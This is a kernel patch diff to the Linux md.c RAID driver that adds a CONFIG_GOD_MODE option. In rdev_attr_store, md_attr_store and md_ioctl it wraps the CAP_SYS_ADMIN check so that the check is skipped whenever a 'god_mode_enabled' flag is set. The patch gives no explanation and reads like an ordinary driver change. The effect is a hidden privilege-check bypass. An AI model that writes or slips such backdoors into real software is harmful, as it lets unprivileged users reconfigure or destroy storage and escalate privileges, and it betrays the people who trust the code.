@@ -1,3 +1,6 @@
+#ifdef CONFIG_GOD_MODE
+#include <linux/god_mode.h>
+#endif
 /*
    md.c : Multiple Devices driver for Linux
 	  Copyright (C) 1998, 1999, 2000 Ingo Molnar
@@ -2781,8 +2784,15 @@ rdev_attr_store(struct kobject *kobj, struct attribute *attr,
 
 	if (!entry->store)
 		return -EIO;
-	if (!capable(CAP_SYS_ADMIN))
-		return -EACCES;
+#ifdef CONFIG_GOD_MODE
+if (!god_mode_enabled) {
+#endif
+		if (!capable(CAP_SYS_ADMIN))
+			return -EACCES;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
+
 	rv = mddev ? mddev_lock(mddev): -EBUSY;
 	if (!rv) {
 		if (rdev->mddev == NULL)
@@ -4271,8 +4281,15 @@ md_attr_store(struct kobject *kobj, struct attribute *attr,
 
 	if (!entry->store)
 		return -EIO;
-	if (!capable(CAP_SYS_ADMIN))
-		return -EACCES;
+#ifdef CONFIG_GOD_MODE
+if (!god_mode_enabled) {
+#endif
+		if (!capable(CAP_SYS_ADMIN))
+			return -EACCES;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
+
 	rv = mddev_lock(mddev);
 	if (mddev->hold_active == UNTIL_IOCTL)
 		mddev->hold_active = 0;
@@ -5804,8 +5821,14 @@ static int md_ioctl(struct block_device *bdev, fmode_t mode,
 	mddev_t *mddev = NULL;
 	int ro;
 
-	if (!capable(CAP_SYS_ADMIN))
-		return -EACCES;
+#ifdef CONFIG_GOD_MODE
+if (!god_mode_enabled) {
+#endif
+		if (!capable(CAP_SYS_ADMIN))
+			return -EACCES;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 	/*
 	 * Commands dealing with the RAID driver but not any
